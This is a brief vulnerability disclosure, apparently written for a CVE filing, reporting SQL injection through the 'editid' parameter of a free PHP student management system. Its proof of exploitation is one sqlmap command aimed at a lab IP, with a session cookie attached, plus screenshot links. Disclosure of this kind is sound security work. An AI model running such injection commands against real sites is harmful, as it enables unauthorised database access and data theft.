vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html

Vulnerability trigger parameter: $editid

The process of vulnerability discovery is as follows：

![image-20230223153431074](C:\markdown\images\image-20230223153431074.png)

exp

```
sqlmap.py -u "http://192.168.31.50/eduauth/student/edit-class-detail.php?editid=1" --cookie "PHPSESSID=po9tmu5iqkuvffteh4b6rur4g0"
```

![image-20230223153333367](C:\markdown\images\image-20230223153333367.png)